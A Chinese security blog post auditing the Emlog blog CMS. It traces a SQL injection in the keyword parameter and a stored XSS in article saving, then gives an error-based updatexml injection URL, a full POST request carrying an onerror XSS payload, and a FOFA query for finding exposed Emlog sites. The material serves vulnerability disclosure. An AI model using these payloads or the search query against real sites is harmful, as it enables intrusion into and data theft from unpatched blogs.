#  【代码审计】Emlog存在SQL注入+XSS漏洞   
 实战安全研究   2025-04-27 02:00  
  
<table><tbody><tr style="margin-top: 8px;margin-bottom: 8px;outline: 0px;max-width: 100%;visibility: visible;word-break: break-all;hyphens: auto;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="557" width="557" valign="top" style="margin-top: 8px;margin-bottom: 8px;padding: 0px;outline: 0px;max-width: 100%;visibility: visible;word-break: break-all;hyphens: auto;box-sizing: border-box !important;overflow-wrap: break-word !important;"><p style="margin-top: 8px;margin-bottom: 8px;outline: 0px;max-width: 100%;visibility: visible;word-break: break-all;hyphens: auto;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(53, 53, 53);font-family: &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, 黑体, Arial, sans-serif;letter-spacing: normal;text-align: start;text-wrap: wrap;outline: 0px;font-size: 14px;visibility: visible;"><span style="outline: 0px;color: rgb(217, 33, 66);visibility: visible;"><strong style="outline: 0px;visibility: visible;"><span data-raw-text="声"><span style="border-width: initial;border-style: none;border-color: initial;display: inline-block;text-indent: initial;"><span leaf="">声</span></span></span></strong></span></span><span style="color: rgb(53, 53, 53);font-family: &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, 黑体, Arial, sans-serif;letter-spacing: normal;text-align: start;text-wrap: wrap;background-color: rgb(255, 255, 255);outline: 0px;font-size: 14px;visibility: visible;"><span style="outline: 0px;color: rgb(217, 33, 66);visibility: visible;"><strong style="outline: 0px;visibility: visible;"><span data-raw-text="明"><span style="display: inline-block;text-indent: initial;"><span leaf="">明</span></span></span><span data-raw-text="："><span style="display: inline-block;text-indent: initial;"><span leaf="">：</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">本</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">文</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">提</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">供</span></span></span></strong></span></span><span style="color: rgb(53, 53, 53);font-family: &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, 黑体, Arial, sans-serif;letter-spacing: normal;text-align: start;text-wrap: wrap;background-color: rgb(255, 255, 255);outline: 0px;font-size: 14px;visibility: visible;"><span style="outline: 0px;color: rgb(217, 33, 66);visibility: visible;"><strong style="outline: 0px;visibility: visible;"><span data-raw-text="部" style="outline: 0px;visibility: visible;"><span style="display: inline-block;text-indent: initial;"><span leaf="">的</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">技</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">术</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">文</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">章</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">仅</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">供</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">参</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">考</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">，</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">此</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">文</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">所</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">提</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">供</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">的</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">信</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">息</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">只</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">为</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">网</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">络</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">安</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">全</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">人</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">员</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">对</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">自</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">己</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">所</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">负</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">责</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">的</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">网</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">站</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">、</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">服</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">务</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">器</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">等</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">（</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">包</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">括</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">但</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">不</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">限</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">于</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">）</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">进</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">行</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">检</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">测</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">或</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">维</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">护</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">参</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">考</span></span><span style="display: inline-block;text-indent: initial;"><span leaf="">，</span></span></span></strong></span></span><strong style="font-family: &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei&#34;, 黑体, Arial, sans-serif;text-align: start;text-wrap: wrap;background-color: rgb(255, 255, 255);color: rgb(217, 33, 66);font-size: 14px;letter-spacing: 0.034em;outline: 0px;visibility: visible;"><span data-raw-text="如"><span style="display: inline-block;text-indent: initial;"><span leaf="">如</span></span></span><span data-raw-text="用"><span style="display: inline-block;text-indent: initial;"><span leaf="">用</span></span></span><span data-raw-text="于"><span style="display: inline-block;text-indent: initial;"><span leaf="">于</span></span></span><span data-raw-text="其"><span style="display: inline-block;text-indent: initial;"><span leaf="">其</span></span></span><span data-raw-text="他"><span style="display: inline-block;text-indent: initial;"><span leaf="">他</span></span></span><span data-raw-text="用"><span style="display: inline-block;text-indent: initial;"><span leaf="">用</span></span></span><span data-raw-text="途"><span style="display: inline-block;text-indent: initial;"><span leaf="">途</span></span></span><span data-raw-text="，"><span style="display: inline-block;text-indent: initial;"><span leaf="">，</span></span></span><span data-raw-text="由"><span style="display: inline-block;text-indent: initial;"><span leaf="">由</span></span></span><span data-raw-text="使"><span style="display: inline-block;text-indent: initial;"><span leaf="">使</span></span></span><span data-raw-text="用"><span style="display: inline-block;text-indent: initial;"><span leaf="">用</span></span></span><span data-raw-text="者"><span style="display: inline-block;text-indent: initial;"><span leaf="">者</span></span></span><span data-raw-text="承"><span style="display: inline-block;text-indent: initial;"><span leaf="">承</span></span></span><span data-raw-text="担"><span style="display: inline-block;text-indent: initial;"><span leaf="">担</span></span></span><span data-raw-text="全"><span style="display: inline-block;text-indent: initial;"><span leaf="">全</span></span></span><span data-raw-text="部"><span style="display: inline-block;text-indent: initial;"><span leaf="">部</span></span></span><span data-raw-text="法"><span style="display: inline-block;text-indent: initial;"><span leaf="">法</span></span></span><span data-raw-text="律"><span style="display: inline-block;text-indent: initial;"><span leaf="">律</span></span></span><span data-raw-text="及"><span style="display: inline-block;text-indent: initial;"><span leaf="">及</span></span></span><span data-raw-text="连"><span style="display: inline-block;text-indent: initial;"><span leaf="">连</span></span></span><span data-raw-text="带"><span style="display: inline-block;text-indent: initial;"><span leaf="">带</span></span></span><span data-raw-text="责"><span style="display: inline-block;text-indent: initial;"><span leaf="">责</span></span></span><span data-raw-text="任"><span style="display: inline-block;text-indent: initial;"><span leaf="">任</span></span></span><span data-raw-text="，"><span style="display: inline-block;text-indent: initial;"><span leaf="">，</span></span></span><span data-raw-text="与"><span style="display: inline-block;text-indent: initial;"><span leaf="">与</span></span></span><span data-raw-text="工"><span style="display: inline-block;text-indent: initial;"><span leaf="">工</span></span></span><span data-raw-text="具"><span style="display: inline-block;text-indent: initial;"><span leaf="">具</span></span></span><span data-raw-text="作"><span style="display: inline-block;text-indent: initial;"><span leaf="">作</span></span></span><span data-raw-text="者"><span style="display: inline-block;text-indent: initial;"><span leaf="">者</span></span></span><span data-raw-text="和"><span style="display: inline-block;text-indent: initial;"><span leaf="">和</span></span></span><span data-raw-text="本"><span style="display: inline-block;text-indent: initial;"><span leaf="">本</span></span></span><span data-raw-text="公"><span style="display: inline-block;text-indent: initial;"><span leaf="">公</span></span></span><span data-raw-text="众"><span style="display: inline-block;text-indent: initial;"><span leaf="">众</span></span></span><span data-raw-text="号"><span style="display: inline-block;text-indent: initial;"><span leaf="">号</span></span></span><span data-raw-text="无"><span style="display: inline-block;text-indent: initial;"><span leaf="">无</span></span></span><span data-raw-text="关"><span style="display: inline-block;text-indent: initial;"><span leaf="">关</span></span></span><span data-raw-text="。"><span style="display: inline-block;text-indent: initial;"><span leaf="">。</span></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 14px;visibility: visible;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;color: rgb(217, 33, 66);visibility: visible;box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;visibility: visible;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span data-raw-text="。"></span></strong></span></span></p></td></tr></tbody></table>  
  
  
   
   
   
  
  
**1.源码简介**  
  
    EMLOG 是一款轻量级开源博客和CMS建站系统，速度快、省资源、易上手，适合各种规模的站点搭建。  
  
  
**2.漏洞描述**  
  
**EMLOG $keyword参数存在SQL注入漏洞。**  
  
EMLOG article.php文件active_post参数存在XSS漏洞  
  
  
**2.影响范围**  
  
****  
EMLOG <=2.7版本  
  
**FOFA:**  
```
App="EMLOG"&&is_domain=true&&country="CN"
```  
  
**危害级别****：高**  
  
**3.代码审计过程**  
  
****  
一、SQL注入漏洞分析过程  
  
  
1、首先打开emlog_pro_2.5.7\admin\media.php文件，$keyword参数由此传入。在  
media.php中，  
keyword参数通过  
Input::getStrVar('keyword')获取。  
  
如下图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8YM9ywQBYJIdEcpLZvxU9BE5uiad3LSibvvF7E9iaZLHXtkBos91CiahgibQ/640?wx_fmt=png&from=appmsg "")  
  
2、接着，这个参数被传递到  
Media_Model的  
getMedias和  
getMediaCount方法中如下图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR801icEo6Krj4ibqb1emfELs2OVenpqXSOB37NewARXVwNkupTUfPUlRNQ/640?wx_fmt=png&from=appmsg "")  
  
3、在Media_Model类的getMedias方法里，构造SQL查询时，直接使用了$keyword变量，并将其拼接到SQL语句中。具体代码行是：emlog_pro_2.5.7\include\model\media_model.php第29行，如图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8u8GInh7xibNUaF3dibVbE7ibWt4pQGNwvaWotPjPkMSxsDrqxnuB8GFXA/640?wx_fmt=png&from=appmsg "")  
  
4、这里明显没有对$keyword进行任何过滤或转义处理，直接将其插入到SQL语句中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8DHsS1oyLxUw1a01ErYKcx11GhKibR0FTrlM0TjeV6nicuMa3fibEBXqVA/640?wx_fmt=png&from=appmsg "")  
  
  
二、XSS  
分析过程  
1、漏洞点在emlog_pro_2.5.7\admin\articel_save.php文件，第45-50行。当$auto_excerpt为'y'时，代码使用Parsedown解析Markdown内容生成HTML摘要。若原始内容包含恶意HTML（如<script>alert(1)</script>），转换后的HTML会被直接存储。若前端未转义摘要内容，将触发XSS。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8nmtklEhxd1BX2DPo5mVTk8qC0W8QmicjvLhMib9QXiaZVzicHLL3wiaEHMw/640?wx_fmt=png&from=appmsg "")  
  
2、跟进extractHtmlData方法未作相关过滤  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR84jSGKvibYspEgBoDPgxJ33ibI8JDmZyT9Bt6hibLQO9ibErUHWQO8IomZA/640?wx_fmt=png&from=appmsg "")  
  
3、接着$excerpt,赋值给$logData  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8ibzzC2Ahm6WQSoibUMW2oWoblLoSpyCnsur2o0OKtNe321Bj1qicpTmHg/640?wx_fmt=png&from=appmsg "")  
  
4、最后在articel_save.php文件，第89行通过doMultiAction保存  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8ORSF1Z5fvEicVmibIKH0cIicTZP3HiavZy5iaK7hknTGu3H9NqYqsPEnBWw/640?wx_fmt=png&from=appmsg "")  
  
5、跟进doMultiAction，通过钩子直接保存数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8Pqb9WqE3fYtphgqLxIrOw6Mx807xJNlmTcjvqpZxvUT04A2jfTBqjw/640?wx_fmt=png&from=appmsg "")  
  
  
综上若原始内容包含恶意HTML（如<script>alert(1)</script>），转换后的HTML会被直接存储。若前端未转义摘要内容，将触发XSS。  
**4. 搭建环境进行验证：**  
Apache  
.  
2  
.  
4.39  
  
MySql5.7.26  
  
P  
hp5.6.9  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8RS1vJwz6l4vEWVcZwBtEbT2Z0TV57URibUUDmPiccw1mk9ict0Yc1vz3g/640?wx_fmt=png&from=appmsg "")  
  
  
安装：  
先在msyql创建emlog数据库再访问web安装即可  
  
## 1、sql注入验证：  
```
http://127.0.0.1:8099/index.php?keyword=%2527%20AND%20updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)%20%20--%2520
```  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8WIhEibdxU9uRKDBtmliau9uowYiaojUDP7lmvYFCJ6x07SoINDGM231EA/640?wx_fmt=png&from=appmsg "")  
  
  
2、xss验证：  
```
POST /emlog_pro_2.5.7/admin/article_save.php HTTP/1.1
Host: 192.168.17.103
Content-Length: 1796
Cache-Control: max-age=0
Origin: http://192.168.17.103
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7dLxxHHoddxnJMVB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.17.103/emlog_pro_2.5.7/admin/article.php?action=edit&gid=2
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_948dba1e5d873b9c1f1c77078c521c89=1744352762; tw_comment_author=1; tk_ai=1%2BA2fri83NiO%2FIPjMIdteEBR; PHPSESSID=24fggvmjq26us7riv236npp743; EM_AUTHCOOKIE_O5MScKeTFAaXFCEtXoNG5gLYyH9s5X4Y=admin%7C0%7Cd6687300a74ea0f8afb2e7164704c7cb; em_saveLastTime=1745478698706
Connection: keep-alive
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="title"
111
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="logcontent"
body"><img src="xss" onerror="alert(/111111111111111/)">
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="logexcerpt"
1111
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="ishide"
n
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="as_logid"
2
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="gid"
2
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="author"
1
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="cover"
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="upload_img"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="sort"
-1
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="tag"
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="postdate"
2025-04-24 14:37:07
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="allow_remark"
y
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="alias"
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="link"
------WebKitFormBoundary7dLxxHHoddxnJMVB
Content-Disposition: form-data; name="password"
------WebKitFormBoundary7dLxxHHoddxnJMVB--
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8FVBcSuLewGMicmUiaib203LqjxiaxY3RN5NnvzCS5ZrVh3gQyH4JGLa0Bg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8Y6uM71tuaTXpIr6TU6iahickDkwNiaE3Vsoy4MZI7tHickvLbj4OL2iaU2A/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**5. nuclei检测脚本：**  
  
**公众号回复Emlog获取检测脚本和源代码**  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR8b584ZqyDojcjZI03KsbEOSLINMJAgam6eEMvYfRCiaiccYkSy1z4lJSQ/640?wx_fmt=png&from=appmsg "")  
  
  
6.修复建议  
  
  
****  
建议使用专门的 Web 应用程序防火墙（WAF）来检测和防止 SQL 注入攻击。WAF 可以提供更强大的安全性，包括自定义规则、恶意模式检测和更高级的防护。  
  
  
nuclei检测  
  
公众号回  
复  
Emlog获取检测脚本和源代码  
  
最后知识星球上线啦  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaib0k4wNj1uEBUXuiaJCNQLAO7pQhWicnR84m4CibL0keqCajpMT3BIlDzrGt67qNaO6W7DRxsM7FIP78beIZUItXQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
